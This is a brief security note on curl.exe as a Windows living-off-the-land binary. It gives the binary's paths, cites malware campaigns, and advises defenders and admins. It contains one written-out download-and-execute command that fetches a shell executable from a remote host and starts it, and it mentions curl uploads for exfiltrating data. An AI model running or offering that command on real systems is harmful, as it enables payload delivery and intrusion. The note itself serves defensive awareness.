#Notes: LOLbin — Curl.exe
Why we treat regsvr32/rundll32 as LOLware version of Curl if we already have Curl in windows?
Curl is included by default in Windows 10 build 17063 and later , As i hunt for LOLbins, I came across curl.exe.
Curl is used to handle files on remote servers.
Attackers can make use of this functionalities to download the payload to victims machine as well as executing them.
The upload function can be used for data exfiltration.
Path:
C:\Windows\System32
C:\Windows\SysWOW64
C:\Windows\WinSxS\amd64_curl_*\
Download and Execute Command:
curl -O http://192.168.191.1/shell191.exe & start shell191.exe
https://t.co/0HrnbSvMH7?amp=1
I found 3 malware campaign used curl libraries and dll compiled curl in their campaign.
Hidden Cobra APT— https://www.us-cert.gov/ncas/analysis-reports/AR18-275A
Platinum group APT — https://securelist.com/titanium-the-platinum-group-strikes-again/94961/
Credential Stealers — https://www.cyberark.com/threat-research-blog/new-sneaky-threat-against-your-chrome-credentials/
From the above 3 campaigns, There was no direct usage of Curl.exe, but due to Windows 7 EOL, there will be a huge migration to Latest windows 10 build and possibilities of using curl.exe without any complicated code will be observed.
Impact:
For defenders, Additional monitoring on curl.exe events and commands by new use cases.
For IT admins, If no need of curl usage in your Org environment, It is recommended to block by policy.
For Red Teamer’s, Play with it.
Proposed to https://lolbas-project.github.io/ for addition.
Cheers!
@reegun21
